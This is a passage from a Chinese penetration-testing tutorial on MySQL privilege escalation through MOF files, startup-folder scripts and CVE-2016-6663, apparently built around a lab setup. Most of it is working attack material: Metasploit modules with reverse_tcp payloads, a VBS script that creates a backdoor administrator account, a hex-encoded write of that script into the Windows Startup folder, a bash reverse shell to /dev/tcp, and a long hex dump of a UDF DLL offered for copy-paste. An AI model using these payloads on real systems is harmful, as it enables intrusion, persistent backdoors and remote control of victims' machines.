+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">BASH<br><span class="hljs-comment"># 停止 winmgmt 服务</span><br>net stop winmgmt<br><br><span class="hljs-comment"># 删除 Repository 文件夹</span><br>rmdir <span class="hljs-regexp">/s /</span>q C:\Windows\system32\wbem\Repository\<br><br><span class="hljs-comment"># 手动删除 mof 文件</span><br>del C:\Windows\system32\wbem\mof\good\test.mof <span class="hljs-regexp">/F /</span>S<br><br><span class="hljs-comment"># 删除创建的用户</span><br>net user hacker /<span class="hljs-keyword">delete</span><br><br><span class="hljs-comment"># 重新启动服务</span><br>net start winmgmt<br></code></pre></td></tr></table></figure>
+
+<h2 id="MSF-MOF-提权"><a href="#MSF-MOF-提权" class="headerlink" title="MSF MOF 提权"></a>MSF MOF 提权</h2><p>MSF 里面也自带了 MOF 提权模块，使用起来也比较方便而且也做到了自动清理痕迹的效果，实际操作起来效率也还不错：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">BASH<br>msf6 &gt; use exploit/windows/mysql/mysql_mof<br><span class="hljs-comment"># 设置好自己的 payload</span><br>msf6 &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><br><span class="hljs-comment"># 设置目标 MySQL 的基础信息</span><br>msf6 &gt; <span class="hljs-built_in">set</span> rhosts 10.211.55.21<br>msf6 &gt; <span class="hljs-built_in">set</span> username root<br>msf6 &gt; <span class="hljs-built_in">set</span> password root<br>msf6 &gt; run<br></code></pre></td></tr></table></figure>
+
+<p>实际运行效果如下：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057532596683.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057532596683.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h1><p>这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p>
+<h2 id="手工复现-2"><a href="#手工复现-2" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="启动项路径"><a href="#启动项路径" class="headerlink" title="启动项路径"></a>启动项路径</h3><p><strong>Windows Server 2003</strong> 的启动项路径：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livescript">BASH<br><span class="hljs-comment"># 中文系统</span><br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\Administrator\「开始」菜单\程序\启动</span><br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\All</span> Users<span class="hljs-string">\「开始」菜单\程序\启动</span><br><br><span class="hljs-comment"># 英文系统</span><br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\Administrator\Start</span> Menu<span class="hljs-string">\Programs\Startup</span><br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\All</span> Users<span class="hljs-string">\Start</span> Menu<span class="hljs-string">\Programs\Startup</span><br><br><span class="hljs-comment"># 开关机项 需要自己建立对应文件夹</span><br>C:<span class="hljs-string">\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br>C:<span class="hljs-string">\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>Windows Server 2008</strong> 的启动项路径：</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">CODE<br><span class="hljs-name">C</span>:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br><span class="hljs-name">C</span>:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup<br></code></pre></td></tr></table></figure>
+
+<p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">BASH<br><span class="hljs-built_in">Set</span> <span class="hljs-attribute">WshShell</span>=WScript.CreateObject(&quot;WScript.Shell&quot;)<br>WshShell.<span class="hljs-built_in">Run</span> <span class="hljs-string">&quot;net user hacker P@ssw0rd /add&quot;</span>, 0<br>WshShell.<span class="hljs-built_in">Run</span> <span class="hljs-string">&quot;net localgroup administrators hacker /add&quot;</span>, 0<br></code></pre></td></tr></table></figure>
+
+<h3 id="MySQL-写入启动项"><a href="#MySQL-写入启动项" class="headerlink" title="MySQL 写入启动项"></a>MySQL 写入启动项</h3><p>将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lsl">SQL<br>mysql &gt; select <span class="hljs-number">0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A</span> into dumpfile <span class="hljs-string">&quot;C:<span class="hljs-subst">\\</span>ProgramData<span class="hljs-subst">\\</span>Microsoft<span class="hljs-subst">\\</span>Windows<span class="hljs-subst">\\</span>Start Menu<span class="hljs-subst">\\</span>Programs<span class="hljs-subst">\\</span>Startup<span class="hljs-subst">\\</span>test.vbs&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</p>
+<h2 id="MSF-启动项提权"><a href="#MSF-启动项提权" class="headerlink" title="MSF 启动项提权"></a>MSF 启动项提权</h2><p>没错，MSF 也封装好了对应的模块，目标系统为 Windows 的情况下可以直接使用该模块来上线 MSF，使用起来也很简单：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">BASH<br>msf6 &gt; use exploit/windows/mysql/mysql_start_up<br><br><span class="hljs-comment"># 配置 MySQL 连接信息</span><br>msf6 &gt; <span class="hljs-built_in">set</span> rhosts 10.211.55.6<br>msf6 &gt; <span class="hljs-built_in">set</span> username root<br>msf6 &gt; <span class="hljs-built_in">set</span> password root<br>msf6 &gt; run<br></code></pre></td></tr></table></figure>
+
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057598832602.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057598832602.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<blockquote>
+<p>STARTUP_FOLDER 启动项文件夹得自己根据实际的目标系统来进行调整</p>
+</blockquote>
+<p>MSF 会写入 exe 木马到启动项中，执行完成后开启监听会话：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BASH</span><br><span class="hljs-attribute">msf6</span> &gt; handler -H <span class="hljs-number">10.20.24.244</span> -P <span class="hljs-number">4444</span> -p windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure>
+
+<p>当目标系统重新登录的时候，MSF 这里可以看到已经成功上线了：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057604132227.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057604132227.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h1 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>国光改了基于网上的教程封装打包了一个 Docker 镜像上传到了 Docker Hub，现在大家部署就会方便许多：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BASH</span><br><span class="hljs-comment"># 拉取镜像</span><br><span class="hljs-attribute">docker</span> pull sqlsec/cve-<span class="hljs-number">2016</span>-<span class="hljs-number">6663</span><br><br><span class="hljs-comment"># 部署镜像</span><br><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> -p <span class="hljs-number">8080</span>:<span class="hljs-number">80</span> --name CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">6663</span> sqlsec/cve-<span class="hljs-number">2016</span>-<span class="hljs-number">6663</span><br></code></pre></td></tr></table></figure>
+
+<p>添加一个 test 数据库用户，密码为 123456 并赋予一些基础权限：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SQL</span><br># 创建 test 数据库<br>mysql &gt; <span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> test;<br><br># 设置 test 密码为 <span class="hljs-number">123456</span><br>mysql &gt; <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>; <br><br># 赋予基础权限<br>mysql &gt; <span class="hljs-keyword">grant</span> <span class="hljs-keyword">create</span>,<span class="hljs-keyword">drop</span>,<span class="hljs-keyword">insert</span>,<span class="hljs-keyword">select</span> <span class="hljs-keyword">on</span> test.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br><br># 刷新权限<br>mysql &gt; flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure>
+
+<p>也可以将上述操作整合成一条命令：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">BASH<br>mysql -uroot -e &quot;<span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> test;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>; grant <span class="hljs-keyword">create</span>,<span class="hljs-keyword">drop</span>,<span class="hljs-keyword">insert</span>,<span class="hljs-keyword">select</span> <span class="hljs-keyword">on</span> test.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;flush privileges;&quot;<br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>竞争条件提权漏洞，一个拥有 CREATE&#x2F;INSERT&#x2F;SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限</p>
+<p><strong>利用成功条件</strong></p>
+<ol>
+<li>Getshell 拿到 www-data 权限</li>
+<li>拿到 CREATE&#x2F;INSERT&#x2F;SELECT 低权限的 MySQL 账户</li>
+<li>关键提取步骤需要在交互环境下，所以需要反弹 shell</li>
+<li>MySQL 版本需要 &lt;&#x3D;5.5.51 或 5.6.x &lt;&#x3D;5.6.32 或 5.7.x &lt;&#x3D;5.7.14 或 8.x &lt; 8.0.1</li>
+<li>MariaDB 版本需要 &lt;&#x3D; 5.5.51 或 10.0.x &lt;&#x3D; 10.0.27 或 10.1.x &lt;&#x3D; 10.1.17</li>
+</ol>
+<p>CVE-2016-6663 EXP mysql-privesc-race.c 参考链接：<a target="_blank" rel="noopener" href="https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html">MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit</a></p>
+<p>通过蚁剑上传 EXP，然后 Bash 反弹 shell：</p>
+<p>首先 10.20.24.244 端口开启监听：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">BASH</span><br>➜  <span class="hljs-regexp">~ ncat</span> -lvp <span class="hljs-number">2333</span><br>Ncat: Version <span class="hljs-number">7</span>.<span class="hljs-number">80</span> ( https://nmap.org/ncat )<br>Ncat: Listening <span class="hljs-literal">on</span> :::<span class="hljs-number">2333</span><br>Ncat: Listening <span class="hljs-literal">on</span> <span class="hljs-number">0.0.0.0:2333</span><br></code></pre></td></tr></table></figure>
+
+<p>蚁剑终端下反弹 Bash：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BASH</span><br><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">10.20.24.244</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057848805997.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057848805997.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>在反弹 shell 的情况下，首先编译 EXP：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">BASH<br>gcc mysql-privesc-race.c -o mysql-privesc-race -I<span class="hljs-regexp">/usr/i</span>nclude/mysql -lmysqlclient<br></code></pre></td></tr></table></figure>
+
+<p>执行 EXP 提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">BASH<br><span class="hljs-comment"># ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库</span><br>./mysql-privesc-race <span class="hljs-built_in">test</span> 123456 localhost <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>
+
+<p>Bingo! 成功，最后的提权成功的效果如下：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057855918281.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057855918281.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>要想获取 root 权限得配合 CVE-2016-6662 与 CVE-2016-6664 这两个漏洞，但是国光 CVE-2016-6664 漏洞复现失败了… 挖个坑，后续有机会再来总结，溜了溜了～～</p>
+<h1 id="文章总结"><a href="#文章总结" class="headerlink" title="文章总结"></a>文章总结</h1><p>现在文章思路慢慢变成了 MySQL 可操控文件怎么将这个危害扩大影响的问题了。可以往管理员桌面上写一个伪造的 CS 木马，如果对方 Office 有漏洞的话可以写入一个带后门的 word 文件，也可以篡改用户常执行的文件等 这样发散开来就变的很广了，国光这里不再一一叙述了，总之实际场景实际分析，大家在渗透的时候也可以多多思考更多的可能性，万一就成功了呢。</p>
+<h1 id="MySQL-UDF-提权十六进制查询"><a href="#MySQL-UDF-提权十六进制查询" class="headerlink" title="MySQL UDF 提权十六进制查询"></a>MySQL UDF 提权十六进制查询</h1><p>UDF 提权常常需要使用原生 SQL 语句来导出 UDF 动态链接库文件，所以本页面就是为了方便自己复制使用。</p>
+<h2 id="Windows-lib-mysqludf-sys-32-dll"><a href="#Windows-lib-mysqludf-sys-32-dll" class="headerlink" title="Windows - lib_mysqludf_sys_32.dll"></a>Windows - lib_mysqludf_sys_32.dll</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffff0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005c80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f0820000000000000000